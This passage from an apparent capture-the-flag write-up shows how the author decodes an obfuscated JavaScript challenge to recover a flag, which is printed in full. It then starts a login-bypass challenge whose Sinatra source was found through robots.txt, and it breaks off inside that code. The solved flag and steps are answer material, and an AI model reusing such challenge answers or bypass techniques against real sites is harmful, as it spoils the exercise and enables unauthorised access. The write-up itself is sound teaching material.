style="color:#c30">&#34;\x55\x48\x4A\x72\x56\x6B\x51\x3D&#34;</span>,<span style="color:#c30">&#34;\x5A\x6E\x56\x75\x59\x33\x52\x70\x62\x32\x34\x67\x4B\x6C\x77\x6F\x49\x43\x70\x63\x4B\x51\x3D\x3D&#34;</span>,<span style="color:#c30">&#34;\x63\x6D\x31\x68\x61\x57\x73\x3D&#34;</span>,<span style="color:#c30">&#34;\x56\x46\x4E\x36\x61\x32\x45\x3D&#34;</span>,<span style="color:#c30">&#34;\x59\x33\x4A\x6D\x59\x32\x34\x3D&#34;</span>,<span style="color:#c30">&#34;\x56\x48\x46\x36\x63\x31\x59\x3D&#34;</span>,<span style="color:#c30">&#34;\x58\x43\x74\x63\x4B\x79\x41\x71\x4B\x44\x38\x36\x58\x7A\x42\x34\x4B\x44\x38\x36\x57\x32\x45\x74\x5A\x6A\x41\x74\x4F\x56\x30\x70\x65\x7A\x51\x73\x4E\x6E\x31\x38\x4B\x44\x38\x36\x58\x47\x4A\x38\x58\x47\x51\x70\x57\x32\x45\x74\x65\x6A\x41\x74\x4F\x56\x31\x37\x4D\x53\x77\x30\x66\x53\x67\x2F\x4F\x6C\x78\x69\x66\x46\x78\x6B\x4B\x53\x6B\x3D&#34;</span>,<span style="color:#c30">&#34;\x64\x47\x56\x7A\x64\x41\x3D\x3D&#34;</span>,<span style="color:#c30">&#34;\x61\x55\x4E\x4C\x62\x31\x41\x3D&#34;</span>,<span style="color:#c30">&#34;\x55\x57\x5A\x71\x5A\x56\x49\x3D&#34;</span>,<span style="color:#c30">&#34;\x54\x6B\x74\x59\x56\x57\x77\x3D&#34;</span>,<span style="color:#c30">&#34;\x54\x46\x4A\x4C\x61\x45\x6B\x3D&#34;</span>,<span style="color:#c30">&#34;\x56\x32\x35\x55\x5A\x55\x55\x3D&#34;</span>,<span style="color:#c30">&#34;\x5A\x32\x46\x31\x62\x31\x4D\x3D&#34;</span>,<span style="color:#c30">&#34;\x65\x57\x4A\x30\x56\x48\x6F\x3D&#34;</span>,<span style="color:#c30">&#34;\x59\x58\x42\x77\x62\x48\x6B\x3D&#34;</span>,<span style="color:#c30">&#34;\x52\x57\x70\x6E\x51\x6B\x30\x3D&#34;</span>,<span style="color:#c30">&#34;\x64\x46\x70\x31\x57\x6D\x6F\x3D&#34;</span>,<span style="color:#c30">&#34;\x55\x48\x70\x59\x63\x30\x55\x3D&#34;</span>,<span style="color:#c30">&#34;\x59\x6C\x5A\x51\x63\x47\x51\x3D&#34;</span>,<span style="color:#c30">&#34;\x53\x45\x64\x48\x53\x32\x77\x3D&#34;</span>,<span style="color:#c30">&#34;\x64\x47\x39\x32\x61\x32\x63\x3D&#34;</span>,<span style="color:#c30">&#34;\x54\x45\x78\x72\x65\x6D\x59\x3D&#34;</span>,<span style="color:#c30">&#34;\x5A\x6D\x52\x43\x52\x58\x55\x3D&#34;</span>,<span style="color:#c30">&#34;\x59\x6B\x74\x46\x55\x32\x73\x3D&#34;</span>,<span style="color:#c30">&#34;\x59\x31\x64\x5A\x52\x31\x6F\x3D&#34;</span>,<span style="color:#c30">&#34;\x76\x61\x72\x20\x5F\x30\x78\x66\x64\x33\x39\x3D\x5B\x22\x73\x65\x63\x75\x72\x65\x73\x69\x74\x65\x22\x2C\x22\x6C\x65\x6E\x67\x74\x68\x22\x2C\x22\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74\x22\x2C\x22\x59\x6F\x75\x20\x68\x61\x76\x65\x20\x79\x6F\x75\x72\x20\x61\x6E\x73\x77\x65\x72\x22\x2C\x22\x6C\x6F\x67\x22\x5D\x3B\x76\x61\x72\x20\x44\x6F\x6E\x74\x43\x68\x61\x6E\x67\x65\x3D\x5B\x36\x36\x2C\x2D\x31\x39\x2C\x2D\x32\x30\x2C\x33\x36\x2C\x2D\x33\x38\x2C\x2D\x36\x35\x2C\x36\x2C\x2D\x31\x33\x2C\x2D\x37\x34\x2C\x2D\x31\x31\x34\x5D\x3B\x76\x61\x72\x20\x75\x73\x65\x72\x3D\x5F\x30\x78\x66\x64\x33\x39\x5B\x30\x5D\x3B\x76\x61\x72\x20\x59\x6F\x75\x72\x41\x6E\x73\x77\x65\x72\x3D\x5B\x30\x2C\x30\x2C\x30\x2C\x30\x2C\x30\x2C\x30\x2C\x30\x2C\x30\x2C\x30\x2C\x30\x5D\x3B\x66\x6F\x72\x28\x76\x61\x72\x20\x69\x3D\x30\x3B\x69\x3C\x20\x44\x6F\x6E\x74\x43\x68\x61\x6E\x67\x65\x5B\x5F\x30\x78\x66\x64\x33\x39\x5B\x31\x5D\x5D\x3B\x69\x2B\x2B\x29\x7B\x69\x66\x28\x28\x44\x6F\x6E\x74\x43\x68\x61\x6E\x67\x65\x5B\x69\x5D\x2B\x20\x59\x6F\x75\x72\x41\x6E\x73\x77\x65\x72\x5B\x69\x5D\x2B\x20\x69\x2A\x20\x31\x30\x29\x21\x3D\x3D\x20\x75\x73\x65\x72\x5B\x5F\x30\x78\x66\x64\x33\x39\x5B\x32\x5D\x5D\x28\x69\x29\x29\x7B\x62\x72\x65\x61\x6B\x7D\x3B\x69\x66\x28\x69\x3D\x3D\x3D\x20\x44\x6F\x6E\x74\x43\x68\x61\x6E\x67\x65\x5B\x5F\x30\x78\x66\x64\x33\x39\x5B\x31\x5D\x5D\x2D\x20\x31\x29\x7B\x63\x6F\x6E\x73\x6F\x6C\x65\x5B\x5F\x30\x78\x66\x64\x33\x39\x5B\x34\x5D\x5D\x28\x5F\x30\x78\x66\x64\x33\x39\x5B\x33\x5D\x29\x7D\x7D&#34;</span>];
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> hint<span style="color:#555">=</span>[_0xd4d0[<span style="color:#f60">0</span>],_0xd4d0[<span style="color:#f60">1</span>],_0xd4d0[<span style="color:#f60">2</span>],_0xd4d0[<span style="color:#f60">3</span>],_0xd4d0[<span style="color:#f60">4</span>],_0xd4d0[<span style="color:#f60">5</span>],_0xd4d0[<span style="color:#f60">6</span>],_0xd4d0[<span style="color:#f60">7</span>],_0xd4d0[<span style="color:#f60">8</span>],_0xd4d0[<span style="color:#f60">9</span>],_0xd4d0[<span style="color:#f60">10</span>],_0xd4d0[<span style="color:#f60">11</span>],_0xd4d0[<span style="color:#f60">12</span>],_0xd4d0[<span style="color:#f60">13</span>],_0xd4d0[<span style="color:#f60">14</span>],_0xd4d0[<span style="color:#f60">15</span>],_0xd4d0[<span style="color:#f60">16</span>],_0xd4d0[<span style="color:#f60">17</span>],_0xd4d0[<span style="color:#f60">18</span>],_0xd4d0[<span style="color:#f60">19</span>],_0xd4d0[<span style="color:#f60">20</span>],_0xd4d0[<span style="color:#f60">21</span>],_0xd4d0[<span style="color:#f60">22</span>],_0xd4d0[<span style="color:#f60">23</span>],_0xd4d0[<span style="color:#f60">24</span>],_0xd4d0[<span style="color:#f60">25</span>],_0xd4d0[<span style="color:#f60">26</span>],_0xd4d0[<span style="color:#f60">27</span>],_0xd4d0[<span style="color:#f60">28</span>],_0xd4d0[<span style="color:#f60">29</span>],_0xd4d0[<span style="color:#f60">30</span>],_0xd4d0[<span style="color:#f60">31</span>],_0xd4d0[<span style="color:#f60">32</span>],_0xd4d0[<span style="color:#f60">33</span>],_0xd4d0[<span style="color:#f60">34</span>],_0xd4d0[<span style="color:#f60">35</span>],_0xd4d0[<span style="color:#f60">36</span>],_0xd4d0[<span style="color:#f60">37</span>],_0xd4d0[<span style="color:#f60">38</span>],_0xd4d0[<span style="color:#f60">39</span>],_0xd4d0[<span style="color:#f60">40</span>],_0xd4d0[<span style="color:#f60">41</span>],_0xd4d0[<span style="color:#f60">42</span>],_0xd4d0[<span style="color:#f60">43</span>],_0xd4d0[<span style="color:#f60">44</span>],_0xd4d0[<span style="color:#f60">45</span>],_0xd4d0[<span style="color:#f60">46</span>],_0xd4d0[<span style="color:#f60">47</span>],_0xd4d0[<span style="color:#f60">48</span>],_0xd4d0[<span style="color:#f60">49</span>],_0xd4d0[<span style="color:#f60">50</span>],_0xd4d0[<span style="color:#f60">51</span>],_0xd4d0[<span style="color:#f60">52</span>],_0xd4d0[<span style="color:#f60">53</span>],_0xd4d0[<span style="color:#f60">54</span>],_0xd4d0[<span style="color:#f60">55</span>],_0xd4d0[<span style="color:#f60">56</span>],_0xd4d0[<span style="color:#f60">57</span>],_0xd4d0[<span style="color:#f60">58</span>],_0xd4d0[<span style="color:#f60">59</span>],_0xd4d0[<span style="color:#f60">60</span>],_0xd4d0[<span style="color:#f60">61</span>],_0xd4d0[<span style="color:#f60">62</span>],_0xd4d0[<span style="color:#f60">63</span>],_0xd4d0[<span style="color:#f60">64</span>],_0xd4d0[<span style="color:#f60">65</span>],_0xd4d0[<span style="color:#f60">66</span>],_0xd4d0[<span style="color:#f60">67</span>],_0xd4d0[<span style="color:#f60">68</span>],_0xd4d0[<span style="color:#f60">69</span>],_0xd4d0[<span style="color:#f60">70</span>],_0xd4d0[<span style="color:#f60">71</span>],_0xd4d0[<span style="color:#f60">72</span>],_0xd4d0[<span style="color:#f60">73</span>],_0xd4d0[<span style="color:#f60">74</span>],_0xd4d0[<span style="color:#f60">75</span>],_0xd4d0[<span style="color:#f60">76</span>],_0xd4d0[<span style="color:#f60">77</span>],_0xd4d0[<span style="color:#f60">78</span>],_0xd4d0[<span style="color:#f60">79</span>],_0xd4d0[<span style="color:#f60">80</span>],_0xd4d0[<span style="color:#f60">81</span>],_0xd4d0[<span style="color:#f60">82</span>],_0xd4d0[<span style="color:#f60">83</span>],_0xd4d0[<span style="color:#f60">84</span>],_0xd4d0[<span style="color:#f60">85</span>],_0xd4d0[<span style="color:#f60">86</span>],_0xd4d0[<span style="color:#f60">87</span>],_0xd4d0[<span style="color:#f60">88</span>],_0xd4d0[<span style="color:#f60">89</span>],_0xd4d0[<span style="color:#f60">90</span>],_0xd4d0[<span style="color:#f60">91</span>],_0xd4d0[<span style="color:#f60">92</span>],_0xd4d0[<span style="color:#f60">93</span>],_0xd4d0[<span style="color:#f60">94</span>],_0xd4d0[<span style="color:#f60">95</span>],_0xd4d0[<span style="color:#f60">96</span>],_0xd4d0[<span style="color:#f60">97</span>],_0xd4d0[<span style="color:#f60">98</span>],_0xd4d0[<span style="color:#f60">99</span>],_0xd4d0[<span style="color:#f60">100</span>],_0xd4d0[<span style="color:#f60">101</span>],_0xd4d0[<span style="color:#f60">102</span>],_0xd4d0[<span style="color:#f60">103</span>],_0xd4d0[<span style="color:#f60">104</span>],_0xd4d0[<span style="color:#f60">105</span>],_0xd4d0[<span style="color:#f60">106</span>],_0xd4d0[<span style="color:#f60">107</span>],_0xd4d0[<span style="color:#f60">108</span>],_0xd4d0[<span style="color:#f60">109</span>],_0xd4d0[<span style="color:#f60">110</span>],_0xd4d0[<span style="color:#f60">111</span>],_0xd4d0[<span style="color:#f60">112</span>],_0xd4d0[<span style="color:#f60">113</span>],_0xd4d0[<span style="color:#f60">114</span>],_0xd4d0[<span style="color:#f60">115</span>],_0xd4d0[<span style="color:#f60">116</span>],_0xd4d0[<span style="color:#f60">117</span>],_0xd4d0[<span style="color:#f60">118</span>],_0xd4d0[<span style="color:#f60">119</span>],_0xd4d0[<span style="color:#f60">120</span>],_0xd4d0[<span style="color:#f60">121</span>],_0xd4d0[<span style="color:#f60">122</span>],_0xd4d0[<span style="color:#f60">123</span>],_0xd4d0[<span style="color:#f60">124</span>],_0xd4d0[<span style="color:#f60">125</span>],_0xd4d0[<span style="color:#f60">126</span>],_0xd4d0[<span style="color:#f60">127</span>],_0xd4d0[<span style="color:#f60">128</span>],_0xd4d0[<span style="color:#f60">129</span>],_0xd4d0[<span style="color:#f60">130</span>],_0xd4d0[<span style="color:#f60">131</span>],_0xd4d0[<span style="color:#f60">132</span>],_0xd4d0[<span style="color:#f60">133</span>],_0xd4d0[<span style="color:#f60">134</span>],_0xd4d0[<span style="color:#f60">135</span>],_0xd4d0[<span style="color:#f60">136</span>],_0xd4d0[<span style="color:#f60">137</span>],_0xd4d0[<span style="color:#f60">138</span>],_0xd4d0[<span style="color:#f60">139</span>],_0xd4d0[<span style="color:#f60">140</span>],_0xd4d0[<span style="color:#f60">141</span>],_0xd4d0[<span style="color:#f60">142</span>],_0xd4d0[<span style="color:#f60">143</span>],_0xd4d0[<span style="color:#f60">144</span>],_0xd4d0[<span style="color:#f60">145</span>],_0xd4d0[<span style="color:#f60">146</span>],_0xd4d0[<span style="color:#f60">147</span>],_0xd4d0[<span style="color:#f60">148</span>],_0xd4d0[<span style="color:#f60">149</span>],_0xd4d0[<span style="color:#f60">150</span>],_0xd4d0[<span style="color:#f60">151</span>],_0xd4d0[<span style="color:#f60">152</span>],_0xd4d0[<span style="color:#f60">153</span>],_0xd4d0[<span style="color:#f60">154</span>],_0xd4d0[<span style="color:#f60">155</span>],_0xd4d0[<span style="color:#f60">156</span>],_0xd4d0[<span style="color:#f60">157</span>],_0xd4d0[<span style="color:#f60">158</span>],_0xd4d0[<span style="color:#f60">159</span>],_0xd4d0[<span style="color:#f60">160</span>],_0xd4d0[<span style="color:#f60">161</span>],_0xd4d0[<span style="color:#f60">162</span>],_0xd4d0[<span style="color:#f60">163</span>],_0xd4d0[<span style="color:#f60">164</span>],_0xd4d0[<span style="color:#f60">165</span>],_0xd4d0[<span style="color:#f60">166</span>],_0xd4d0[<span style="color:#f60">167</span>],_0xd4d0[<span style="color:#f60">168</span>],_0xd4d0[<span style="color:#f60">169</span>],_0xd4d0[<span style="color:#f60">170</span>],_0xd4d0[<span style="color:#f60">171</span>],_0xd4d0[<span style="color:#f60">172</span>],_0xd4d0[<span style="color:#f60">173</span>],_0xd4d0[<span style="color:#f60">174</span>],_0xd4d0[<span style="color:#f60">175</span>],_0xd4d0[<span style="color:#f60">176</span>],_0xd4d0[<span style="color:#f60">177</span>],_0xd4d0[<span style="color:#f60">178</span>],_0xd4d0[<span style="color:#f60">179</span>],_0xd4d0[<span style="color:#f60">180</span>],_0xd4d0[<span style="color:#f60">181</span>],_0xd4d0[<span style="color:#f60">182</span>],_0xd4d0[<span style="color:#f60">183</span>],_0xd4d0[<span style="color:#f60">184</span>],_0xd4d0[<span style="color:#f60">185</span>],_0xd4d0[<span style="color:#f60">186</span>],_0xd4d0[<span style="color:#f60">187</span>],_0xd4d0[<span style="color:#f60">188</span>],_0xd4d0[<span style="color:#f60">189</span>],_0xd4d0[<span style="color:#f60">190</span>],_0xd4d0[<span style="color:#f60">191</span>],_0xd4d0[<span style="color:#f60">192</span>],_0xd4d0[<span style="color:#f60">193</span>],_0xd4d0[<span style="color:#f60">194</span>],_0xd4d0[<span style="color:#f60">195</span>],_0xd4d0[<span style="color:#f60">196</span>],_0xd4d0[<span style="color:#f60">197</span>],_0xd4d0[<span style="color:#f60">198</span>],_0xd4d0[<span style="color:#f60">199</span>],_0xd4d0[<span style="color:#f60">200</span>],_0xd4d0[<span style="color:#f60">201</span>],_0xd4d0[<span style="color:#f60">202</span>],_0xd4d0[<span style="color:#f60">203</span>],_0xd4d0[<span style="color:#f60">204</span>],_0xd4d0[<span style="color:#f60">205</span>],_0xd4d0[<span style="color:#f60">206</span>],_0xd4d0[<span style="color:#f60">207</span>],_0xd4d0[<span style="color:#f60">208</span>],_0xd4d0[<span style="color:#f60">209</span>],_0xd4d0[<span style="color:#f60">210</span>],_0xd4d0[<span style="color:#f60">211</span>],_0xd4d0[<span style="color:#f60">212</span>],_0xd4d0[<span style="color:#f60">213</span>],_0xd4d0[<span style="color:#f60">214</span>],_0xd4d0[<span style="color:#f60">215</span>],_0xd4d0[<span style="color:#f60">216</span>],_0xd4d0[<span style="color:#f60">217</span>],_0xd4d0[<span style="color:#f60">218</span>],_0xd4d0[<span style="color:#f60">219</span>],_0xd4d0[<span style="color:#f60">220</span>],_0xd4d0[<span style="color:#f60">221</span>],_0xd4d0[<span style="color:#f60">222</span>],_0xd4d0[<span style="color:#f60">223</span>],_0xd4d0[<span style="color:#f60">224</span>],_0xd4d0[<span style="color:#f60">225</span>],_0xd4d0[<span style="color:#f60">226</span>],_0xd4d0[<span style="color:#f60">227</span>],_0xd4d0[<span style="color:#f60">228</span>],_0xd4d0[<span style="color:#f60">229</span>],_0xd4d0[<span style="color:#f60">230</span>],_0xd4d0[<span style="color:#f60">231</span>],_0xd4d0[<span style="color:#f60">232</span>],_0xd4d0[<span style="color:#f60">233</span>],_0xd4d0[<span style="color:#f60">234</span>],_0xd4d0[<span style="color:#f60">235</span>],_0xd4d0[<span style="color:#f60">236</span>],_0xd4d0[<span style="color:#f60">237</span>],_0xd4d0[<span style="color:#f60">238</span>],_0xd4d0[<span style="color:#f60">239</span>],_0xd4d0[<span style="color:#f60">240</span>],_0xd4d0[<span style="color:#f60">241</span>],_0xd4d0[<span style="color:#f60">242</span>],_0xd4d0[<span style="color:#f60">243</span>],_0xd4d0[<span style="color:#f60">244</span>],_0xd4d0[<span style="color:#f60">245</span>],_0xd4d0[<span style="color:#f60">246</span>],_0xd4d0[<span style="color:#f60">247</span>],_0xd4d0[<span style="color:#f60">248</span>],_0xd4d0[<span style="color:#f60">249</span>],_0xd4d0[<span style="color:#f60">250</span>],_0xd4d0[<span style="color:#f60">251</span>],_0xd4d0[<span style="color:#f60">252</span>],_0xd4d0[<span style="color:#f60">253</span>],_0xd4d0[<span style="color:#f60">254</span>],_0xd4d0[<span style="color:#f60">255</span>],_0xd4d0[<span style="color:#f60">256</span>],_0xd4d0[<span style="color:#f60">257</span>],_0xd4d0[<span style="color:#f60">258</span>],_0xd4d0[<span style="color:#f60">259</span>],_0xd4d0[<span style="color:#f60">260</span>],_0xd4d0[<span style="color:#f60">261</span>],_0xd4d0[<span style="color:#f60">262</span>],_0xd4d0[<span style="color:#f60">263</span>],_0xd4d0[<span style="color:#f60">264</span>],_0xd4d0[<span style="color:#f60">265</span>],_0xd4d0[<span style="color:#f60">266</span>],_0xd4d0[<span style="color:#f60">267</span>],_0xd4d0[<span style="color:#f60">268</span>],_0xd4d0[<span style="color:#f60">269</span>],_0xd4d0[<span style="color:#f60">270</span>],_0xd4d0[<span style="color:#f60">271</span>],_0xd4d0[<span style="color:#f60">272</span>],_0xd4d0[<span style="color:#f60">273</span>],_0xd4d0[<span style="color:#f60">274</span>],_0xd4d0[<span style="color:#f60">275</span>],_0xd4d0[<span style="color:#f60">276</span>],_0xd4d0[<span style="color:#f60">277</span>],_0xd4d0[<span style="color:#f60">278</span>],_0xd4d0[<span style="color:#f60">279</span>],_0xd4d0[<span style="color:#f60">280</span>],_0xd4d0[<span style="color:#f60">281</span>],_0xd4d0[<span style="color:#f60">282</span>],_0xd4d0[<span style="color:#f60">283</span>],_0xd4d0[<span style="color:#f60">284</span>],_0xd4d0[<span style="color:#f60">285</span>],_0xd4d0[<span style="color:#f60">286</span>],_0xd4d0[<span style="color:#f60">287</span>],_0xd4d0[<span style="color:#f60">288</span>],_0xd4d0[<span style="color:#f60">289</span>],_0xd4d0[<span style="color:#f60">290</span>],_0xd4d0[<span style="color:#f60">291</span>],_0xd4d0[<span style="color:#f60">292</span>],_0xd4d0[<span style="color:#f60">293</span>],_0xd4d0[<span style="color:#f60">294</span>],_0xd4d0[<span style="color:#f60">295</span>],_0xd4d0[<span style="color:#f60">296</span>],_0xd4d0[<span style="color:#f60">297</span>],_0xd4d0[<span style="color:#f60">298</span>],_0xd4d0[<span style="color:#f60">299</span>],_0xd4d0[<span style="color:#f60">300</span>],_0xd4d0[<span style="color:#f60">301</span>],_0xd4d0[<span style="color:#f60">302</span>],_0xd4d0[<span style="color:#f60">303</span>]]
</span></span></code></pre></td></tr></table>
</div>
</div><p>Running it in the js console, we can see that the <code>hint</code> consist of base64 string. Try to decode each of it will gave us the part 2 of the flag. We got <code>_b3g1n5_w1th_4n_</code>
<p class="markdown-image">
  <img src="https://i.imgur.com/Zv0iDkr.png" alt=""  />
</p></p>
<p>Now, the last part, if we check <code>_0xd4d0[304]</code> value, we will get another javascript code.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> _0xfd39<span style="color:#555">=</span>[<span style="color:#c30">&#34;securesite&#34;</span>,<span style="color:#c30">&#34;length&#34;</span>,<span style="color:#c30">&#34;charCodeAt&#34;</span>,<span style="color:#c30">&#34;You have your answer&#34;</span>,<span style="color:#c30">&#34;log&#34;</span>];<span style="color:#069;font-weight:bold">var</span> DontChange<span style="color:#555">=</span>[<span style="color:#f60">66</span>,<span style="color:#555">-</span><span style="color:#f60">19</span>,<span style="color:#555">-</span><span style="color:#f60">20</span>,<span style="color:#f60">36</span>,<span style="color:#555">-</span><span style="color:#f60">38</span>,<span style="color:#555">-</span><span style="color:#f60">65</span>,<span style="color:#f60">6</span>,<span style="color:#555">-</span><span style="color:#f60">13</span>,<span style="color:#555">-</span><span style="color:#f60">74</span>,<span style="color:#555">-</span><span style="color:#f60">114</span>];<span style="color:#069;font-weight:bold">var</span> user<span style="color:#555">=</span>_0xfd39[<span style="color:#f60">0</span>];<span style="color:#069;font-weight:bold">var</span> YourAnswer<span style="color:#555">=</span>[<span style="color:#f60">0</span>,<span style="color:#f60">0</span>,<span style="color:#f60">0</span>,<span style="color:#f60">0</span>,<span style="color:#f60">0</span>,<span style="color:#f60">0</span>,<span style="color:#f60">0</span>,<span style="color:#f60">0</span>,<span style="color:#f60">0</span>,<span style="color:#f60">0</span>];<span style="color:#069;font-weight:bold">for</span>(<span style="color:#069;font-weight:bold">var</span> i<span style="color:#555">=</span><span style="color:#f60">0</span>;i<span style="color:#555">&lt;</span> DontChange[_0xfd39[<span style="color:#f60">1</span>]];i<span style="color:#555">++</span>){<span style="color:#069;font-weight:bold">if</span>((DontChange[i]<span style="color:#555">+</span> YourAnswer[i]<span style="color:#555">+</span> i<span style="color:#555">*</span> <span style="color:#f60">10</span>)<span style="color:#555">!==</span> user[_0xfd39[<span style="color:#f60">2</span>]](i)){<span style="color:#069;font-weight:bold">break</span>};<span style="color:#069;font-weight:bold">if</span>(i<span style="color:#555">===</span> DontChange[_0xfd39[<span style="color:#f60">1</span>]]<span style="color:#555">-</span> <span style="color:#f60">1</span>){console[_0xfd39[<span style="color:#f60">4</span>]](_0xfd39[<span style="color:#f60">3</span>])}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Basically, to get the last part of the flag, we just need to calculate <code>user[_0xfd39[2]](i)-(i* 10)-DontChange[i]</code>.
<p class="markdown-image">
  <img src="https://i.imgur.com/ueYuijt.png" alt=""  />
</p>
We got the flag :D</p>
<blockquote>
<p>Flag: p_ctf{INfjnity5_b3g1n5_w1th_4n_1nc3pt10n}</p>
</blockquote>
<h3 id="code-of-chaos">Code of Chaos <a href="#code-of-chaos" class="anchor">#</a></h3>
<p>We were given a website, where we need to bypass the login page.
<p class="markdown-image">
  <img src="https://i.imgur.com/lRJfRlZ.png" alt=""  />
</p>
Checking the robots.txt, we found the source code of the website.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#366">require</span> <span style="color:#c30">&#39;sinatra/base&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#366">require</span> <span style="color:#c30">&#39;sinatra&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#366">require</span> <span style="color:#c30">&#34;sinatra/cookies&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>get <span style="color:#c30">&#39;/&#39;</span> <span style="color:#069;font-weight:bold">do</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> request<span style="color:#555">.</span>cookies<span style="color:#555">[</span><span style="color:#c30">&#39;auth&#39;</span><span style="color:#555">]</span>
</span></span><span style="display:flex;"><span>@user <span style="color:#555">=</span> getUsername() <span style="color:#09f;font-style:italic"># getUsername() - Method to get username from cookies</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> @user<span style="color:#555">.</span>upcase <span style="color:#555">==</span> <span style="color:#c30">&#34;MICHAEL&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">return</span> erb <span style="color:#fc3">:michael</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">end</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">return</span> <span style="color:#fc3">erb</span>:index
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">else</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">return</span> erb <span style="color:#fc3">:index</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">end</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>post <span style="color:#c30">&#39;/login&#39;</span> <span style="color:#069;font-weight:bold">do</span>
</span></span><span style="display:flex;"><span>user <span style="color:#555">=</span> params<span style="color:#555">[</span><span style="color:#c30">&#39;username&#39;</span><span style="color:#555">].</span>to_s<span style="color:#555">[</span><span style="color:#f60">0</span><span style="color:#555">..</span><span style="color:#f60">20</span><span style="color:#555">]</span>
